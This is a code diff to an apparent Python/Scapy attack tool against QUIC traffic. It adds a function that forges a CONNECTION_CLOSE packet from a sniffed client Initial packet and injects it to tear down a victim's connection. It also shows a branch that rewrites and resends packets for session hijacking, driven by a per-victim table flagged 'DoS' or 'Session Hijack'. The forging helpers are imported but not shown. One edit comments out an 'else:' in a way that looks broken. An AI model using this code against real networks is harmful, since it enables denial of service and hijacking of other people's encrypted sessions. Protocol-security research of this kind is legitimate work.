@@ -5,15 +5,16 @@ from scapy.all import *
 load_contrib("quic")
 
 from scapy.layers.quic import *
-from connection_close import QUIC_CONNECTION_CLOSE
+from connection_close import QUIC_CONNECTION_CLOSE, QUIC_CONNECTION_CLOSE_0x1C_PAYLOAD
 bind_bottom_up(UDP, QUIC, dport=443)
 bind_layers(UDP, QUIC, dport=443, sport=443)
 
-from forge import forge_cc_scapy
+from forge import forge_cc_scapy, forge_cc_2
 import threading, sys, os, multiprocessing
 from victims import Victims, IPv4Address
 from quic_protected import *
 from test_server.server import main
+from aioquic.quic.packet import QuicProtocolVersion
 
 
 
@@ -75,7 +76,7 @@ def send_attack(victim, PacketNumberLen):
         dcid_secret = dcid_for_keys,
         dcid_header = dcid_in_header,
         tpl = tpl,
-        frame = frame, PacketNumberLen=PacketNumberLen, ver="V2") # "V1" for version 1, "V2" for version 2.
+        frame = frame, PacketNumberLen=PacketNumberLen, ver="V1") # "V1" for version 1, "V2" for version 2.
     #forged.show()
     #QUIC(bytes(forged)).show()
     """raw = forged
@@ -83,6 +84,20 @@ def send_attack(victim, PacketNumberLen):
     udp = ip[UDP]
     QUIC(udp.payload.load).show()"""
     send(forged, iface=inner_iface, verbose=False)
+
+
+
+def send_attack3(victim):
+    forged = forge_cc_2(
+        tpl=(victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport),
+        client_scid=victim[QUIC_Initial].SrcConnID,
+        client_dcid=victim[QUIC_Initial].DstConnID,
+        version=QuicProtocolVersion.VERSION_1) 
+    if forged is None:
+        print("ERROR IN send_a3!")
+    else:
+        send(forged, iface=inner_iface, verbose=False)
+
 
 def handle_quic(pkt):
     global vs
@@ -96,7 +111,8 @@ def handle_quic(pkt):
                 #print(f"CLHO PacketLength: {bin(pkt[QUIC_Initial].PacketNumberLen)}")
                 if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                     #send_attack2(pkt,ver="V1")
-                    send_attack(pkt, PacketNumberLen = pkt[QUIC_Initial].PacketNumberLen)
+                    #send_attack(pkt, PacketNumberLen = pkt[QUIC_Initial].PacketNumberLen)
+                    send_attack3(pkt)
                     return
                 elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                     new_pkt = pkt[IP]
@@ -124,7 +140,7 @@ def handle_quic(pkt):
                 del new_pkt.getlayer(UDP).chksum
                 #print(f"New PKT to client: {new_pkt.summary()}")
                 send(new_pkt, iface=inner_iface, verbose=False)
-            else:
+            #else:
                 #print("A packet of unknown LAN destination.")
                 # Need to fix change of victim sport with new connections of same src and dest ips.
 
